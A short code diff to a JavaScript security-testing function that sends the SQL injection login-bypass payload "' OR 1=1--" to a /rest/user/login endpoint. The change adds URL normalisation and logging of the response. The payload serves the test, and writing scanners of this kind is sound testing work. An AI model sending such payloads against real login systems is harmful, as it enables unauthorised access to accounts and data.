@@ -1,5 +1,6 @@
 export async function testLoginSqlInjection(baseUrl) {
-  const url = `${baseUrl.replace(/\/$/, "")}/rest/user/login`;
+  const normalized = baseUrl.startsWith("http") ? baseUrl : `http://${baseUrl}`;
+  const url = `${normalized.replace(/\/$/, "")}/rest/user/login`;
 
   const payload = {
     email: "' OR 1=1--",
@@ -16,8 +17,10 @@ export async function testLoginSqlInjection(baseUrl) {
   try {
     response = await fetch(url, requestInit);
     bodyText = await response.text();
+    console.log("SQLi test response status:", response.status, "body:", bodyText.slice(0, 200));
   } catch (err) {
-    return []; // target unreachable
+    console.error("SQL server not reached the target",err.message);
+    return []; // target not reached !!
   }
 
   const evidence = {
